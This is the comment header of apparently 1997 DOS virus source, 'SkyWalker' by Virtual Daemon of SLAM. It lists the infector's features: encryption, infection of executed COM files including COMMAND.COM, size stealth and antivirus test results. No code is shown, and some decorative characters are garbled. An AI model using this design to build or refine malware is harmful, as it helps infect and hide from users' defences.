...
; ------------------------------------------------------------
;
;    S�k�y�W�a�l�k�e�r                 Written by Virtual Daemon [SLAM] 1997
; �������������������������������������������������������������������������į
;
;  Description:
;  ������������
;    į Virus Name: SkyWalker
;    į Virus Author: Virtual Daemon
;    į Group: SLAM
;    į Virus Size: 709 bytes
;    į Virus Type: TSR COM infector
;  Comments:
;  ���������
;    į XOR Encryption with a random variable
;    į Infect files via 4bh (load or execute)
;    į Size-Stealth on 11h/12h (find 1st/next FCB), 4eh/4fh (find 1st/next
;       DTA), 3dh (open) and 6c00h (extended open)
;    į Save/Restore file's date/time/attributes
;    į Int 24h handler (no errors)
;    į Infect COMMAND.COM
;    į Infect read only files
;    į NO Payload... :(
;  Anti-Virus Tests:
;  �����������������
;    į No detection with AidsTest
;    į No detection with Toolkit
;    į 'Unknown virus' detection with F-Prot 2.27 full heuristic
;    į 'Unknown virus' detection with AVP 2.xx
;
